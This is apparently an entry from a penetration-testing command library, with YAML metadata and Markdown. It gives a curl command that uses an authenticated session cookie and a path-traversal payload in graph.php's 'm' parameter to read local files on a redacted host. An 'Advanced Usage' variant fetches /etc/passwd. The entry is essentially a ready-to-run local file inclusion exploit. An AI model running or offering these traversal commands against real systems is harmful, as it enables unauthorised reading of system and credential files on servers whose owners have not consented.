---
id: cmd-curl-lfi
data: >-
  curl -b cookies.txt
  'https://████/graph.php?p=7&m=../../../../../../usr/share/apache2/icons/pie'
  -o lfi_output
tags:
  - lfi
  - path-traversal
  - http-get
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:05.809Z'
verified: false
validated: true
submitted: true
---
# curl-lfi-traversal

## Command

```bash
curl -b cookies.txt 'https://████/graph.php?p=7&m=../../../../../../usr/share/apache2/icons/pie' -o lfi_output
```

## Description

Exploits path traversal in graph.php 'm' parameter to read arbitrary local file.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-b cookies.txt` | Auth session | Yes |
| `m=../../../../../../...` | Traversal payload | Yes |
| `-o lfi_output` | Save exploited output | Yes |

## Examples

### Basic Usage

```bash
curl -b cookies.txt 'https://████/graph.php?p=7&m=../../../../../../usr/share/apache2/icons/pie' -o lfi_output
```

### Advanced Usage

```bash
curl -b cookies.txt 'https://████/graph.php?m=../../../../../../etc/passwd' -o passwd_output
```

## Expected Output

File content (e.g., image binary or text) in lfi_output.

## Related

- [[Related Procedure: Exploit-LFI-Path-Traversal-in-graph.php]]
